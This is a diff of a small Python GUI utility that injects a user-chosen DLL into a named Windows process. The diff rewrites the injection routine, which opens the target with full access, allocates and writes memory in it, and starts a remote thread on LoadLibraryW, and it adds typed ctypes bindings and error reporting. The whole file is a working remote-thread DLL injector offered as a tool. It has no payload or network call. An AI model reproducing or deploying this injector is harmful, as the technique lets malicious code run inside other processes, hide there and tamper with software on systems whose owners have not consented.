@@ -1,11 +1,45 @@
 import tkinter as tk
 from tkinter import filedialog as fd
-from ctypes import *
-import psutil as ps
+import ctypes
+import ctypes.wintypes as wintypes
+import psutil
 import os
 
-def getpid(process_name):
-    for proc in ps.process_iter(['pid', 'name']):
+PROCESS_ALL_ACCESS = 0x1F0FFF
+MEM_COMMIT = 0x1000
+MEM_RESERVE = 0x2000
+PAGE_READWRITE = 0x04
+
+SIZE_T = ctypes.c_size_t
+LPVOID = ctypes.c_void_p
+HANDLE = wintypes.HANDLE
+BOOL = wintypes.BOOL
+DWORD = wintypes.DWORD
+
+kernel32 = ctypes.WinDLL('Kernel32', use_last_error=True)
+
+OpenProcess = kernel32.OpenProcess
+OpenProcess.restype = HANDLE
+OpenProcess.argtypes = (DWORD, BOOL, DWORD)
+
+VirtualAllocEx = kernel32.VirtualAllocEx
+VirtualAllocEx.restype = LPVOID
+VirtualAllocEx.argtypes = (HANDLE, LPVOID, SIZE_T, DWORD, DWORD)
+
+WriteProcessMemory = kernel32.WriteProcessMemory
+WriteProcessMemory.restype = BOOL
+WriteProcessMemory.argtypes = (HANDLE, LPVOID, ctypes.c_void_p, SIZE_T, ctypes.POINTER(SIZE_T))
+
+CreateRemoteThread = kernel32.CreateRemoteThread
+CreateRemoteThread.restype = HANDLE
+CreateRemoteThread.argtypes = (HANDLE, LPVOID, SIZE_T, LPVOID, LPVOID, DWORD, ctypes.POINTER(DWORD))
+
+GetProcAddress = kernel32.GetProcAddress
+GetProcAddress.restype = LPVOID
+GetProcAddress.argtypes = (HANDLE, ctypes.c_char_p)
+
+def get_process_id(process_name):
+    for proc in psutil.process_iter(['pid', 'name']):
         if proc.info['name'].lower() == process_name.lower():
             return proc.info['pid']
     return None
@@ -13,35 +47,46 @@ def getpid(process_name):
 def inject():
     process_name = entry_process.get().strip()
     dll_path = entry_file.get().strip()
+    
     if not process_name or not dll_path:
         output_label.config(text="Invalid process name or DLL path!")
         return
     if not os.path.exists(dll_path):
         output_label.config(text="The DLL path does not exist!")
         return
-    pid = getpid(process_name)
-    if not pid:
-        output_label.config(text=f"Process '{process_name}' not found!")
-        return
-    PAGE_READWRITE = 0x04
-    PROCESS_ALL_ACCESS = (0x00F0000 | 0x00100000 | 0xFFF)
-    VIRTUAL_MEM = (0x1000 | 0x2000)
-    kernel32 = windll.kernel32
-    dll_len = len(dll_path)
-    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, True, pid)
-    if not h_process:
-        output_label.config(text=f"Unable to get handle for PID {pid}!")
-        return
-    arg_address = kernel32.VirtualAllocEx(h_process, 0, dll_len, VIRTUAL_MEM, PAGE_READWRITE)
-    written = c_int(0)
-    kernel32.WriteProcessMemory(h_process, arg_address, dll_path.encode('utf-8'), dll_len, byref(written))
-    h_kernel32 = kernel32.GetModuleHandleA(b"kernel32.dll")
-    h_loadlib = kernel32.GetProcAddress(h_kernel32, b"LoadLibraryA")
-    thread_id = c_ulong(0)
-    if not kernel32.CreateRemoteThread(h_process, None, 0, h_loadlib, arg_address, 0, byref(thread_id)):
-        output_label.config(text="Failed :(")
-        return
-    output_label.config(text=f"Completed! Thread ID: 0x{thread_id.value:08x}")
+    
+    try:
+        process_id = get_process_id(process_name)
+        if not process_id:
+            output_label.config(text=f"Could not find process '{process_name}'.")
+            return
+        process_handle = OpenProcess(PROCESS_ALL_ACCESS, False, process_id)
+        if not process_handle:
+            output_label.config(text=f"Failed to open process. Error code: {ctypes.get_last_error()}")
+            return
+        dll_path_encoded = dll_path.encode('utf-16-le')
+        size = len(dll_path_encoded) + 2
+        allocated_memory = VirtualAllocEx(process_handle, None, SIZE_T(size), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
+        if not allocated_memory:
+            output_label.config(text=f"Failed to allocate memory in target process. Error code: {ctypes.get_last_error()}")
+            return
+        written_size = SIZE_T(0)
+        write = WriteProcessMemory(process_handle, allocated_memory, dll_path_encoded, SIZE_T(size), ctypes.byref(written_size))
+        if not write:
+            output_label.config(text=f"Failed to write DLL to target process. Error code: {ctypes.get_last_error()}")
+            return
+        load_library_address = GetProcAddress(kernel32._handle, b'LoadLibraryW')
+        if not load_library_address:
+            output_label.config(text=f"Failed to get LoadLibraryW address. Error code: {ctypes.get_last_error()}")
+            return
+        thread_id = DWORD(0)
+        thread_handle = CreateRemoteThread(process_handle, None, 0, load_library_address, allocated_memory, 0, ctypes.byref(thread_id))
+        if not thread_handle:
+            output_label.config(text=f"Failed to create remote thread. Error code: {ctypes.get_last_error()}")
+            return
+        output_label.config(text="DLL injection successful!")
+    except Exception as e:
+        output_label.config(text=f"An error occurred: {str(e)}")
 
 def select_dll():
     path = fd.askopenfilename(
